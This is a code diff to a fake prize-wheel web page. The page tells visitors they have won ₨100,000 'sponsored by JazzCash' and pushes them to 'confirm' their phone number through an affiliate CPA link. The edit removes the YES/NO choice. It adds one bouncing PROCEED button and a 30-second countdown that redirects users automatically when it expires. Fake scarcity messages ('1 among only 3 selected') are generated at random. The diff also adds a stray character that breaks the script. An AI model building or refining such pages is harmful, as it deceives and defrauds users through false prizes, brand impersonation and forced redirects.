@@ -399,11 +399,6 @@
     .money-img {
       font-size: 55px;
       margin: 15px 0;
-      animation: bounce 1s infinite;
-    }
-    @keyframes bounce {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
     }
 
     .emergency-timer {
@@ -460,7 +455,7 @@
       50% { box-shadow: 0 0 15px rgba(255,215,0,0.5); }
     }
 
-    .btn-primary, .btn-yes, .btn-no, .btn-ok {
+    .btn-primary, .btn-proceed, .btn-ok {
       width: 100%;
       padding: 13px;
       border: none;
@@ -472,12 +467,20 @@
       transition: all 0.2s;
     }
     .btn-primary { background: var(--primary); color: #000; box-shadow: 0 4px 12px rgba(37,211,102,0.3); }
-    .btn-yes { background: var(--primary); color: #000; }
-    .btn-no { background: #1a1a1a; color: #888; border: 1px solid #333; }
+    .btn-proceed { 
+      background: var(--primary); 
+      color: #000; 
+      box-shadow: 0 4px 12px rgba(37,211,102,0.3);
+      animation: bounce-btn 0.8s infinite;
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+    @keyframes bounce-btn {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-6px); box-shadow: 0 8px 20px rgba(37,211,102,0.5); }
+    }
     .btn-ok { background: #fff; color: #000; margin-top: 6px; }
-
-    .actions { display: flex; gap: 10px; margin-top: 8px; }
-    .actions button { flex: 1; }
 
     .hidden { display: none !important; }
     @media(max-width:360px) { .wheel-wrapper { width: 290px; height: 290px; } }
@@ -560,59 +563,24 @@
     </div>
   </div>
 
-  <!-- POST-SPIN MODAL -->
+  <!-- SECOND POPUP (Last popup with single PROCEED button) -->
   <div id="winConfirmModal" class="modal-overlay">
     <div class="modal">
       <h3>🎉 Yeah! You have won <span style="color:#FFD700;">₨100,000</span></h3>
       <div class="money-img">💰💵💸</div>
       <p>Confirm your phone number to claim your reward now!</p>
       <div class="scarcity-note" id="scarcityNote2">🔥 You are 1 among only 3 selected today!</div>
-      <div class="actions">
-        <button class="btn-yes" id="winYesBtn">YES</button>
-        <button class="btn-no" id="winNoBtn">NO</button>
+      <div class="emergency-timer">
+        <div>⚠️ OFFER EXPIRES IN</div>
+        <div class="timer-display" id="countdownTimer">00:30</div>
+        <div class="timer-label">Tap PROCEED now before it's too late!</div>
       </div>
+      <button class="btn-proceed" id="proceedBtn">PROCEED</button>
       <div class="modal-sponsor">
         <span>Sponsored by</span>
         <span style="font-weight:700; color:#e80000;">JazzCash</span>
         <img src="https://banner2.cleanpng.com/lnd/20250110/pw/d0ad8bb55bc068ecf2058516429406.webp" alt="JazzCash" style="height:20px;" onerror="this.style.display='none';">
       </div>
-    </div>
-  </div>
-
-  <!-- YES PATH -->
-  <div id="confirmPhoneModal" class="modal-overlay">
-    <div class="modal">
-      <h3>📞 Confirm Your Phone Number</h3>
-      <div class="money-img">📱💸💰</div>
-      <p>Tap the button below to confirm your phone number and claim <strong style="color:#FFD700;">₨100,000</strong> instantly!</p>
-      <div class="scarcity-note" id="scarcityNote3">🔥 You are 1 among only 3 selected today!</div>
-      <div class="emergency-timer">
-        <div>⚠️ OFFER EXPIRES IN</div>
-        <div class="timer-display" id="countdownTimer1">00:45</div>
-        <div class="timer-label">Claim before time runs out!</div>
-      </div>
-      <button class="btn-primary" id="confirmPhoneCtaBtn">Confirm Phone Number to Claim</button>
-      <div class="modal-sponsor">
-        <span>Sponsored by</span>
-        <span style="font-weight:700; color:#e80000;">JazzCash</span>
-        <img src="https://banner2.cleanpng.com/lnd/20250110/pw/d0ad8bb55bc068ecf2058516429406.webp" alt="JazzCash" style="height:20px;" onerror="this.style.display='none';">
-      </div>
-    </div>
-  </div>
-
-  <!-- NO PATH -->
-  <div id="lastStepModal" class="modal-overlay">
-    <div class="modal">
-      <h3>⏳ Complete the simple last step to claim your reward</h3>
-      <div class="money-img">🎁💎🏆</div>
-      <p>Don't miss out on <strong style="color:#FFD700;">₨100,000</strong>! Just one click away.</p>
-      <div class="scarcity-note" id="scarcityNote4">🔥 You are 1 among only 3 selected today!</div>
-      <div class="emergency-timer">
-        <div>⚠️ OFFER EXPIRES IN</div>
-        <div class="timer-display" id="countdownTimer2">00:30</div>
-        <div class="timer-label">Tap OK now before it's too late!</div>
-      </div>
-      <button class="btn-ok" id="lastStepOkBtn">OK</button>
     </div>
   </div>
 
@@ -625,8 +593,6 @@
       const centerIcon = document.getElementById('centerSpin');
       const initialModal = document.getElementById('initialModal');
       const winConfirmModal = document.getElementById('winConfirmModal');
-      const confirmPhoneModal = document.getElementById('confirmPhoneModal');
-      const lastStepModal = document.getElementById('lastStepModal');
       const commentsList = document.getElementById('comments-list');
       const confettiCanvas = document.getElementById('confetti-canvas');
       const confettiCtx = confettiCanvas.getContext('2d');
@@ -636,11 +602,9 @@
       let userCountryName = 'Pakistan';
       let userCountryFlag = '🇵🇰';
       let userIP = 'Loading...';
-      let countdownInterval1 = null;
-      let countdownInterval2 = null;
-      let countdownSeconds1 = 45;
-      let countdownSeconds2 = 30;
-      let selectedCount = 3; // Store the scarcity number
+      let countdownInterval = null;
+      let countdownSeconds = 30;
+      let selectedCount = 3;
 
       const WHEEL_SEGMENTS = [
         { label: "₨100,000", color: "#151515", accent: "#FFD700", icon: "💰", amount: "₨100,000" },
@@ -685,7 +649,7 @@
         document.getElementById('userIP').textContent = userIP;
         document.getElementById('initialDevice').textContent = detectDeviceType();
         document.getElementById('userCountry').textContent = userCountryFlag + ' ' + userCountryName;
-        selectedCount = Math.floor(Math.random() * 2) + 2; // 2 or 3
+        selectedCount = Math.floor(Math.random() * 2) + 2;
         updateAllScarcityNotes();
         initialModal.style.display = 'flex';
       }
@@ -823,50 +787,27 @@
         animateConfetti();
       }
 
-      function startCountdown1() {
-        countdownSeconds1 = 45;
-        const timerDisplay = document.getElementById('countdownTimer1');
+      function startCountdown() {
+        countdownSeconds = 30;
+        const timerDisplay = document.getElementById('countdownTimer');
         function updateTimer() {
-          const minutes = Math.floor(countdownSeconds1 / 60);
-          const seconds = countdownSeconds1 % 60;
+          const minutes = Math.floor(countdownSeconds / 60);
+          const seconds = countdownSeconds % 60;
           timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-          if (countdownSeconds1 <= 10) timerDisplay.style.color = '#ff0000';
-          if (countdownSeconds1 <= 0) {
-            clearInterval(countdownInterval1);
+          if (countdownSeconds <= 10) timerDisplay.style.color = '#ff0000';
+          if (countdownSeconds <= 0) {
+            clearInterval(countdownInterval);
             timerDisplay.textContent = "00:00";
             window.location.href = CPA_LINK;
           }
-          countdownSeconds1--;
+          countdownSeconds--;
         }
         updateTimer();
-        countdownInterval1 = setInterval(updateTimer, 1000);
+        countdownInterval = setInterval(updateTimer, 1000);
       }
 
-      function stopCountdown1() {
-        if (countdownInterval1) { clearInterval(countdownInterval1); countdownInterval1 = null; }
-      }
-
-      function startCountdown2() {
-        countdownSeconds2 = 30;
-        const timerDisplay = document.getElementById('countdownTimer2');
-        function updateTimer() {
-          const minutes = Math.floor(countdownSeconds2 / 60);
-          const seconds = countdownSeconds2 % 60;
-          timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-          if (countdownSeconds2 <= 10) timerDisplay.style.color = '#ff0000';
-          if (countdownSeconds2 <= 0) {
-            clearInterval(countdownInterval2);
-            timerDisplay.textContent = "00:00";
-            window.location.href = CPA_LINK;
-          }
-          countdownSeconds2--;
-        }
-        updateTimer();
-        countdownInterval2 = setInterval(updateTimer, 1000);
-      }
-
-      function stopCountdown2() {
-        if (countdownInterval2) { clearInterval(countdownInterval2); countdownInterval2 = null; }
+      function stopCountdown() {
+        if (countdownInterval) { clearInterval(countdownInterval); countdownInterval = null; }
       }
 
       function startSpin() {
@@ -886,9 +827,10 @@
         currentRotation += finalRotation;
 
         setTimeout(() => {
-          updateAllScarcityNotes(); // Refresh scarcity on all popups
+          updateAllScarcityNotes();
           winConfirmModal.style.display = 'flex';
           startConfetti();
+          startCountdown();
           spinBtn.disabled = false;
           centerIcon.style.pointerEvents = 'auto';
           spinBtn.textContent = "TAP TO SPIN";
@@ -903,27 +845,8 @@
         initialModal.style.display = 'none';
       });
 
-      document.getElementById('winYesBtn').addEventListener('click', () => {
-        updateAllScarcityNotes();
-        winConfirmModal.style.display = 'none';
-        confirmPhoneModal.style.display = 'flex';
-        startCountdown1();
-      });
-
-      document.getElementById('winNoBtn').addEventListener('click', () => {
-        updateAllScarcityNotes();
-        winConfirmModal.style.display = 'none';
-        lastStepModal.style.display = 'flex';
-        startCountdown2();
-      });
-
-      document.getElementById('confirmPhoneCtaBtn').addEventListener('click', () => {
-        stopCountdown1();
-        window.location.href = CPA_LINK;
-      });
-
-      document.getElementById('lastStepOkBtn').addEventListener('click', () => {
-        stopCountdown2();
+      document.getElementById('proceedBtn').addEventListener('click', () => {
+        stopCountdown();
         window.location.href = CPA_LINK;
       });
 
@@ -985,7 +908,7 @@
       });
       commentInput.addEventListener('keypress', (e) => {
         if(e.key === 'Enter') postBtn.click();
-      });
+      });a
 
       fetchIPInfo();
     })();
